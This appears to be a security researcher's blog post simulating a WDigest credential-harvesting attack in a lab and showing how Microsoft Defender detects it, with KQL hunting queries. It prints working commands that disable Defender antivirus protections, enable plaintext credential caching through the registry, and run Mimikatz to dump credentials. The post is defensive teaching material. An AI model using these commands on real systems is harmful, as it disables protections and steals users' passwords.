# Day 13 - WDigest credential harvesting - attack
Hi there !! Thank you for visiting [@SecurityResearch-Note](https://github.com/LearningKijo/SecurityResearcher-Note). 
Today, I'm diving into the WDigest credential harvesting attack, breaking it down into three parts. 
1. WDigest credential harvesting - Attack technique 
2. WDigest credential harvesting - Detection
3. WDigest credential harvesting - Threat Hunting

#### Attack overview
WDigest, an outdated authentication protocol still found in corporate networks, is exploited by attackers to steal passwords and evade security measures. 
Its use exposes passwords in plain text, making it a favored target. Attackers modify registry settings to enable WDigest, often using various attack vectors. 


![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/05b4876b-ebe3-48fc-8b59-398cffe0d928)
> WDigest credential harvesting attack flow, [Threat Analytics](https://learn.microsoft.com/en-us/microsoft-365/security/defender/threat-analytics?view=o365-worldwide) in Microsoft 365 Defender

## Attack technique
The attack flow begins with disabling the antivirus solution to change a registry key, enabling WDigest, and downloading the Mimikatz tool. 
Following this, a command is executed to enable WDigest and run the Mimikatz tool using the "sekurlsa::wdigest" command.

#### 1. Disable Microsoft Defender antivirus
   - [x] DisableRealtimeMonitoring,  [Real-time protection]
   - [x] SpynetReporting, [Cloud-delivered protection]
   - [x] SubmitSamplesConsent, [Automatic sample submission]

```powershell
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f
```

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/28105886-3f1d-4cea-8de8-c7048a60bd9a)

> [!Important]
> These commands disabled Microsoft Defender Antivirus configurations. To prevent and detect these attack techniques, enabling [Tamper Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide) is the most effective approach, as it safeguards against disabling antivirus.

#### 2. Enable Wdigest
[MITRE | ATT&CK, Modify Registry, T1112, Wdigest](https://attack.mitre.org/techniques/T1112/)

```powershell
reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
```

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/49e3a65c-fe1c-42da-9ac6-902fa5f1f51b)

> [!Important]
> Even if the antivirus didn't detect and prevent the WDigest configuration change, Microsoft Defender for Endpoint, as EDR solution, can detect these activities and provide alerts.

#### 3. Download & Execute Mimikatz tool
Download - [GitHub - ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::wdigest
```

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/9ef03db8-22a6-45fc-a8ca-5ac7dd4bb298)

> [!Important]
> In terms of endpoint protection, Microsoft Defender Antivirus and Microsoft Defender for Endpoint are the most effective solutions for preventing and detecting Mimikatz activities.
> Additionally, when it comes to addressing lateral movement and enhancing identity visibility, Microsoft Defender for Identity is a valuable product for detecting such activities.

## Detection
After simulating a WDigest credential harvesting attack, let's examine how this attack is mapped into a single incident in Microsoft 365 Defender portal.

All the attack techniques, from disabling antivirus to executing Mimikatz, were detected by Microsoft Defender for Endpoint, generating 11 alerts. Additionally, Threat Analytics provides insights related to Mimikatz and WDigest credential harvesting.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/1c9c3f9d-4ff2-4269-b67f-f6d6a67f72b3)

In the incident page, you might see a number of alerts, related assets, MITRE techniques, and more. 
At the same time, I'd like to highlight some alerts from the simulation as shown below.

#### ***Alert : Microsoft Defender Antivirus protection turned off***
A protection feature in Microsoft Defender Antivirus has been turned off. An attacker might be trying to evade detection.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/dde8b17c-38bc-4847-87fc-d8940ebc8313)

#### ***Alert : WDigest configuration change***
An attempt to turn on the WDigest authentication provider through the registry was observed.
If the attempt is successful, WDigest will load on the next restart and begin to store credentials as plaintext in LSASS process memory. An attacker might be attempting to collect those credentials.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/8065422f-a296-46a3-82a0-71a0997108db)

#### ***Alert : Malicious credential theft tool execution detected***
A known credential theft tool execution command line was detected. Either the process itself or its command line indicated an intent to dump users' credentials, keys, plain-text passwords and more.
> [!Note]
> The two mimikatz commands (mimikatz # privilege::debug, mimikatz # sekurlsa::wdigest) which I simulated on the device were detected by Microsoft Defender for Endpoint. Also, an alert - 'Mimikatz credential theft tool' was triggered when downloading Mimikatz on the device.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/d4325269-853e-4488-837d-2a56e77b0928)


## Threat Hunting
For threat hunting purposes, here are some KQL queries to track activities like disabling antivirus, changing WDigest configurations, and executing Mimikatz tool.

#### Defender Antivirus configuration
This query will hunt for registry key activities related to Microsoft Defender Antivirus.

```kql
DeviceRegistryEvents
| where Timestamp > ago(30d)
| where RegistryKey has @"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"
| project-reorder Timestamp, DeviceId, DeviceName, ActionType, RegistryKey, RegistryValueType, RegistryValueName, RegistryValueData
| sort by Timestamp desc 
```

#### WDigest configuration change
This query helps identify attempts to enable WDigest credentiall caching through the registry.

```kql
union DeviceRegistryEvents, DeviceProcessEvents
// Find attempts to turn on WDigest credential caching
| where RegistryKey contains "wdigest" and RegistryValueName == "UseLogonCredential" and RegistryValueData == "1" or 
// Find processes created with commandlines that attempt to turn on WDigest caching
ProcessCommandLine has "WDigest" and ProcessCommandLine has "UseLogonCredential" and ProcessCommandLine has "dword" and ProcessCommandLine has "1"
| project Timestamp, DeviceName, PreviousRegistryValueData,  
RegistryKey, RegistryValueName, RegistryValueData, FileName, ProcessCommandLine, 
InitiatingProcessAccountName, InitiatingProcessFileName, 
InitiatingProcessCommandLine, InitiatingProcessParentFileName
```
> **Source** : WDigest credential harvesting, Threat Analytics in Microsoft 365 Defender

#### Mimikatz CommandLine
This query helps display all unique Mimikatz command-line activities for each device.

```kql
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("powershell.exe","powershell_ise.exe", "mimikatz.exe")
| where ProcessCommandLine has_any ("sekurlsa","kerberos","crypto", "vault", "lsadump") or InitiatingProcessCommandLine has_any ("sekurlsa","kerberos","crypto", "vault", "lsadump")
| summarize make_set(ProcessCommandLine) by DeviceId, DeviceName
```

## Reference
1. [Forcing WDigest to Store Credentials in Plaintext](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext)
2. "WDigest credential harvesting", from [Threat Analytics](https://learn.microsoft.com/en-us/microsoft-365/security/defender/threat-analytics?view=o365-worldwide) in Microsoft 365 Defender

#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
